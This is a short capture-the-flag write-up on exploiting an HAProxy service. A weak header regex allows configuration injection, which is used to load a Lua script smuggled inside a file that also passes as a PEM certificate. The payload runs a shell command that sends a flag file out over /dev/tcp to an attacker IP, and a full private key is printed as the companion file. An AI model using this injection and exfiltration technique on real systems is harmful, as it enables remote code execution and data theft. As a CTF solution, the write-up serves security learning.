This is a configuration injection in HAProxy.

You can add custom headers to your haproxy instance (cf: http://www.haproxy.org/).

Here, the validation of headers are not really great..

```python
def is_http_header(header: str) -> bool:
    m = re.match(r'\w{3,20} \w{3,200}', header)
    return m is not None
```

So we have a configuration injection! (ex: header="test test\n    whatever_you_want_here") The question now is, what to inject?

After digging a bit we inderstand that you can load LUA scripts in HAProxy. But how upload an LUA script? 

The website validate the ssl certificate/key using openssl. But here are 2 files that are valid both as a LUA script and as a openssl certificate or key:

```lua
os.execute("(sleep 1 && bash -c 'cat /var/lib/haproxy/the_flag_q4ZIDK2PYLo5yVszgsWZ > /dev/tcp/{IP}/4455') &") --[[
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAOf9+/oig+EfMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMTcwNDAxMjIyMDA4WhcNMTgwNDAxMjIyMDA4WjBF
MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEAoqR+RBT5Xg90Lf3WIUHvFKNFP3kI8QFZ3CY+R3JloWzCIvB+HFJTNp24
hrtIaOd3llNa8jqjXEKGEcWAVdw3p+7Eo58PTZEwSk+q4FgnNMEp+Fgy/SRb2qZx
9Fu4W4nORFJ9A0Livm2oRCIMUW1AQZjolUqc6/atZ2UEZ9Mp7iog5xzOSWfeaMZP
impFbBfgSlpe8BweRD5pPdFLxgttYxE6zVFhE5vZVSrgWo8aXskMUhppgxQsLGXw
2QhgbEqtHe6hiN12BcVaF98581h2z5r2Q53awJX6dPbxzUBrY3SEw3o+oZu6Ywzi
U8LB4MhfiQAIdIjvNG3C2zuyfI+N6wIDAQABo1AwTjAdBgNVHQ4EFgQUAglJb8Pj
/hb1D+7IeKTVw5rEpAQwHwYDVR0jBBgwFoAUAglJb8Pj/hb1D+7IeKTVw5rEpAQw
DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAGejiTs40m84md6GygrFg
+qbT3j2a0y2VJm4rYyA32z4v8iBMTbB+mPuzY5TL11PHAobhXoX25X0koGslpHtQ
iwxA4kdx4bk2oc5SYfz1K0QoZrGGEQ9g44RsMAPlROJbOF1i4wa4zmm5EjkrY6ib
YlqanZHp7si4gnikj3JrXaxLsqiREnCYB0v5yCRNrQPawvuiByLXhT+fPyPxJkK8
PuMoibi/bhnatmbqUdzs6JFZPU72lMYh7yS82JamcAqH53dOQ7m+QIl8ggxo8jLU
vEFtZiTSzRJ/se347aB9HSWTk04uIMosYvPtLuh2FWyhWGigMeiQQ0oz+lVRQz/H
6A==
-----END CERTIFICATE-----
--]]
```


```lua
--[[
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCipH5EFPleD3Qt
/dYhQe8Uo0U/eQjxAVncJj5HcmWhbMIi8H4cUlM2nbiGu0ho53eWU1ryOqNcQoYR
xYBV3Den7sSjnw9NkTBKT6rgWCc0wSn4WDL9JFvapnH0W7hbic5EUn0DQuK+bahE
IgxRbUBBmOiVSpzr9q1nZQRn0ynuKiDnHM5JZ95oxk+KakVsF+BKWl7wHB5EPmk9
0UvGC21jETrNUWETm9lVKuBajxpeyQxSGmmDFCwsZfDZCGBsSq0d7qGI3XYFxVoX
3znzWHbPmvZDndrAlfp09vHNQGtjdITDej6hm7pjDOJTwsHgyF+JAAh0iO80bcLb
O7J8j43rAgMBAAECggEAXculcdfys9cPtlJUQhvHKEy8a81+ZZbU3sxDUGrdx4l0
MDgnUmf7y1yMBU9OhAkxA0WRBm7gtR08OlV/HIUCp9tgFchuR9p6UfC95+GOwrK/
ZJRg23IzctZYk4atvESt6uLza4UQRKfyyVAlcHQkAXCQeUBtXPuGp0EvmDzESq+f
ZmOyxdFXey0nDsHoGhvL7fMQTFpAGHInjy6+pIOMgKsrHEL+FkgAU668kC8h5/Z4
jd2Fbpq8y66slgPGOw9LH4r9xbixanJvezVnqQhQogQLq36KQNYY3oPzDGpfG8Up
iawSWeW8vRlv9e2e4Fc4+NADG5N/awnDS5YAgPoWWQKBgQDWM8oTdXd6v/3dj1l8
9ZEMTbacHk7fJ0vCAiR92DXvjo6j3jhj8/CujkkZTu1BO9crZyOXk8bzw2a41aHC
YdIr4jwPwi15PsYNSn9hDK0LvdktkWVoq3rtKoFw2dLSJdOGGL5Ibmp+vf3mp4S5
AtY+q35dm2gWWCzhbZeYDW4PNwKBgQDCYRm0HmXmEFEOVo3LJuSH4gN5WIi+iTf8
TfROMCTh2edpsssiFY4sQyxPZqQ2JCQj7nA5YkBnA9OW8cD1hS/0MTD1aGKgr3so
mBo+sECeKKO/A2sbAFRPL1isIPS5WjXyN/SDNV2wbP552EybAn6LliDzZpDkd2BQ
R3Nf+7xI7QKBgEAgWQriS9avy6yc0cmbKsVoLpcma65a8U8vnQUfyWXiY8mjKXai
/RcE+dVdz6GL7KrNwdYLI7Cuev4y1q5+4pDItfpxw3Nc26X2+5NuXA/70hzWPmnL
jI2cAAxs6bSIJn8qwSymAbPX5T88P3uz4bf5V2dmsw6dbzI9wPiAbMaZAoGAGebQ
gwTt9StFcdCs0l5bY5QFfH0Es8cbM767iFO4BnR/9sDBesg+ir1kwSvfQ+uq+TLD
t5HVHSUQY/PRD6ZwzmxjpsADLIBVvAIQtTvNUIX/0+tDsXRox6h6e21kzvIrcBxu
s7E/y8uqWVguVRWPAVC/EVAgjKEvr2LmB+tGmr0CgYBPsPB7+aiS3STE5B6IPcNd
jni/p3DK9hICiMCqXiS+J3FmkXI9DCMFkM1d8vmzUJX5e11wQSbP98LkIZOQdXqX
iggL5sXR3zHwZgKQPQxYlHRzdvRJ+CCtOlOhUUTeiQBKiI5QuQwNQV2EC+h+zjcm
cVJiYsjlQiWDKwElCr3d6A==
-----END PRIVATE KEY-----
--]]

```

You just have to upload those ssl cert/key and load the PEM file as a lua script using your configuration injection.

Job is done!
